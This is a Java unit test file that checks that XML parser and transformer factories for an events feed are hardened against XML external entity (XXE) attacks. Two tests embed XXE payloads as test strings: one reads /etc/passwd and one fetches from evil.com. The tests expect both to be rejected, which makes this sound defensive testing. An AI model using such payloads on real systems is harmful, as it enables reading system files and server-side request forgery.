package visitraleigh.events.feed;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.StringWriter;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.xml.sax.SAXParseException;

class XmlSecurityConfigurerTest {

    private XmlSecurityConfigurer configurer;

    @BeforeEach
    void setUp() {
        configurer = new XmlSecurityConfigurer();
    }

    @Test
    void createSecureDocumentBuilderFactory_createsFactory() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        assertThat(factory).isNotNull();
    }

    @Test
    void createSecureDocumentBuilderFactory_canParseValidXml() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String validXml = "<?xml version='1.0'?><root><item>Test</item></root>";
        Document doc = builder.parse(new ByteArrayInputStream(validXml.getBytes()));

        assertThat(doc).isNotNull();
        assertThat(doc.getDocumentElement().getTagName()).isEqualTo("root");
    }

    @Test
    void createSecureDocumentBuilderFactory_preventsXXE() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String xxeXml = "<?xml version='1.0'?>"
                + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
                + "<root><item>&xxe;</item></root>";

        assertThatThrownBy(() -> builder.parse(new ByteArrayInputStream(xxeXml.getBytes())))
                .isInstanceOf(SAXParseException.class);
    }

    @Test
    void createSecureDocumentBuilderFactory_preventsExternalEntities() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String externalEntityXml = "<?xml version='1.0'?>"
                + "<!DOCTYPE foo [<!ENTITY ext SYSTEM 'http://evil.com/payload'>]>"
                + "<root><item>&ext;</item></root>";

        assertThatThrownBy(() -> builder.parse(
                new ByteArrayInputStream(externalEntityXml.getBytes())))
                .isInstanceOf(SAXParseException.class);
    }

    @Test
    void createSecureDocumentBuilderFactory_hasXIncludeDisabled() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        assertThat(factory.isXIncludeAware()).isFalse();
    }

    @Test
    void createSecureDocumentBuilderFactory_hasEntityExpansionDisabled() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        assertThat(factory.isExpandEntityReferences()).isFalse();
    }

    @Test
    void createSecureDocumentBuilderFactory_hasFeatureDisallowDoctype() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        boolean disallowDoctype = factory.getFeature(
                "http://apache.org/xml/features/disallow-doctype-decl");
        assertThat(disallowDoctype).isTrue();
    }

    @Test
    void createSecureDocumentBuilderFactory_hasExternalGeneralEntitiesDisabled() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        boolean externalGeneralEntities = factory.getFeature(
                "http://xml.org/sax/features/external-general-entities");
        assertThat(externalGeneralEntities).isFalse();
    }

    @Test
    void createSecureDocumentBuilderFactory_hasExternalParameterEntitiesDisabled()
            throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        boolean externalParameterEntities = factory.getFeature(
                "http://xml.org/sax/features/external-parameter-entities");
        assertThat(externalParameterEntities).isFalse();
    }

    @Test
    void createSecureDocumentBuilderFactory_hasLoadExternalDtdDisabled() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();

        boolean loadExternalDtd = factory.getFeature(
                "http://apache.org/xml/features/nonvalidating/load-external-dtd");
        assertThat(loadExternalDtd).isFalse();
    }

    @Test
    void createSecureTransformerFactory_createsFactory() {
        TransformerFactory factory = configurer.createSecureTransformerFactory();

        assertThat(factory).isNotNull();
    }

    @Test
    void createSecureTransformerFactory_canTransformXml() throws Exception {
        DocumentBuilderFactory docFactory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
        Document doc = docBuilder.newDocument();
        doc.appendChild(doc.createElement("root"));

        TransformerFactory transformerFactory = configurer.createSecureTransformerFactory();
        Transformer transformer = transformerFactory.newTransformer();

        StringWriter writer = new StringWriter();
        transformer.transform(new DOMSource(doc), new StreamResult(writer));

        String result = writer.toString();
        assertThat(result).contains("<root");
    }

    @Test
    void createSecureTransformerFactory_hasAccessExternalDtdRestricted() {
        TransformerFactory factory = configurer.createSecureTransformerFactory();

        String accessExternalDtd = (String) factory.getAttribute(
                XMLConstants.ACCESS_EXTERNAL_DTD);
        assertThat(accessExternalDtd).isEmpty();
    }

    @Test
    void createSecureTransformerFactory_hasAccessExternalStylesheetRestricted() {
        TransformerFactory factory = configurer.createSecureTransformerFactory();

        String accessExternalStylesheet = (String) factory.getAttribute(
                XMLConstants.ACCESS_EXTERNAL_STYLESHEET);
        assertThat(accessExternalStylesheet).isEmpty();
    }

    @Test
    void createSecureDocumentBuilderFactory_canParseRssStructure() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String rssXml = "<?xml version='1.0'?>"
                + "<rss version='2.0'>"
                + "<channel>"
                + "<title>Test Feed</title>"
                + "<item>"
                + "<title>Test Item</title>"
                + "<description>Test Description</description>"
                + "</item>"
                + "</channel>"
                + "</rss>";

        Document doc = builder.parse(new ByteArrayInputStream(rssXml.getBytes()));

        assertThat(doc.getDocumentElement().getTagName()).isEqualTo("rss");
        assertThat(doc.getElementsByTagName("item").getLength()).isEqualTo(1);
    }

    @Test
    void createSecureDocumentBuilderFactory_canParseEmptyElements() throws Exception {
        DocumentBuilderFactory factory = configurer.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String xmlWithEmpty = "<?xml version='1.0'?>"
                + "<root>"
                + "<empty/>"
                + "<hasContent>content</hasContent>"
                + "</root>";

        Document doc = builder.parse(new ByteArrayInputStream(xmlWithEmpty.getBytes()));

        assertThat(doc.getElementsByTagName("empty").getLength()).isEqualTo(1);
        assertThat(doc.getElementsByTagName("hasContent").getLength()).isEqualTo(1);
    }
}
